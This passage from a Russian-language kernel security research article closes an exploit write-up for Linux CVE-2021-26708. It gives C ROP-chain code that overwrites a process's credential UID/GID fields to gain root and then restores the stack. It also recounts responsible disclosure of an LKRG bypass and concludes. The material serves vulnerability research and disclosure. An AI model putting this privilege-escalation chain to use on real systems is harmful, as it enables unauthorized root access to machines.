#define ROP_MOV_QWORD_PTR_RAX_0_RET	(0xFFFFFFFF8112E6D7lu + kaslr_offset)

/* 3. Perform privilege escalation */
rop_gadget[i++] = ROP_POP_RAX_RET;		/* pop rax ; ret */
rop_gadget[i++] = owner_cred + CRED_UID_GID_OFFSET;
rop_gadget[i++] = ROP_MOV_QWORD_PTR_RAX_0_RET;	/* mov qword ptr [rax], 0 ; ret */
rop_gadget[i++] = ROP_POP_RAX_RET;		/* pop rax ; ret */
rop_gadget[i++] = owner_cred + CRED_EUID_EGID_OFFSET;
rop_gadget[i++] = ROP_MOV_QWORD_PTR_RAX_0_RET;	/* mov qword ptr [rax], 0 ; ret */
```

Финальная часть ROP-цепочки восстанавливает начальное значение регистра `RSP` из данных объекта `sk_buff` по отступу `SAVED_RSP_OFFSET`:

```c
/* 4. Restore RSP and continue */
rop_gadget[i++] = ROP_POP_RAX_RET;		 /* pop rax ; ret */
rop_gadget[i++] = uaf_write_value + SAVED_RSP_OFFSET;
rop_gadget[i++] = ROP_MOV_RAX_QWORD_PTR_RAX_RET; /* mov rax, qword ptr [rax] ; ret */
rop_gadget[i++] = ROP_PUSH_RAX_POP_RBX_RET;	 /* push rax ; pop rbx ; ret */
rop_gadget[i++] = ROP_PUSH_RBX_POP_RSP_RET;
		  /* push rbx ; add eax, 0x415d0060 ; pop rsp ; ret */
```

После этого ядро возобновляет обработку системного вызова `recv()`, но процесс эксплоита при этом обладает привилегиями пользователя `root`. Всё, пожалуй, это была самая сложная часть статьи.

<center><img src="/img/detail.png" width="85%">
<br/>Николай Ломакин. Первая деталь. 1953
</center>
<br/>

## Ответственное разглашение информации

О результатах моих экспериментов с LKRG я сообщил Адаму Заброцки и Александру Песляку ([Solar Designer](https://twitter.com/solardiz)) 10 июня 2021 года. Мы детально обсудили мои способы обхода защиты LKRG и обменялись мнениями о проекте в целом.

С позволения Адама и Александра 3 июля я [опубликовал результаты моего исследования](https://www.openwall.com/lists/lkrg-users/2021/07/03/1) в открытом списке рассылки `lkrg-users`. На момент публикации этой статьи мой метод атаки все еще работает. Для защиты требуется переработка архитектуры LKRG, которая планируются в будущем.

На мой взгляд, LKRG — замечательный проект. Когда я начал изучать его, я сразу же отметил, что Адам и другие разработчики приложили большие усилия, чтобы сделать качественный и красивый продукт. Вместе с тем я убежден, что обнаружение последствий эксплуатации ядерных уязвимостей на уровне самого ядра невозможно. Альберт Эйнштейн [говорил](https://ru.citaty.net/tsitaty/482501-albert-einshtein-nevozmozhno-reshit-problemu-na-tom-zhe-urovne-na-ko/): «Невозможно решить проблему на том же уровне, на котором она возникла».

Другими словами, защита LKRG должна работать на другом уровне или в другом контексте, чтобы обнаруживать деятельность атакующего в ядре. В частности, модуль LKRG мог бы представлять большую преграду для атакующего, если бы он был перенесен на уровень гипервизора или же в Arm Trusted Execution Environment. Такое портирование — сложная инженерная задача, и для ее решения разработчикам LKRG требуется поддержка сообщества и, возможно, заинтересованных в проекте компаний.

## Заключение

В этой статье я описал, как я доработал свой прототип эксплоита для уязвимости [CVE-2021-26708](https://nvd.nist.gov/vuln/detail/CVE-2021-26708) в ядре Linux. Это было интересное исследование с большим количеством практики по возвратно-ориентированному программированию и ассемблеру. Я искал ROP/JOP-гаджеты в памяти работающей системы и смог выполнить переключение ядерного стека (stack pivoting) в ограниченных условиях. Я также провел анализ защиты [Linux Kernel Runtime Guard](https://github.com/openwall/lkrg) с позиции атакующего, разработал новый способ атаки на LKRG и предоставил результаты своего исследования команде разработчиков этого проекта.

Я уверен, что эта статья будет полезна для сообщества разработчиков Linux, поскольку она отражает многие практические аспекты безопасности ядра. И еще я хочу сказать спасибо компании Positive Technologies за возможность провести это исследование.

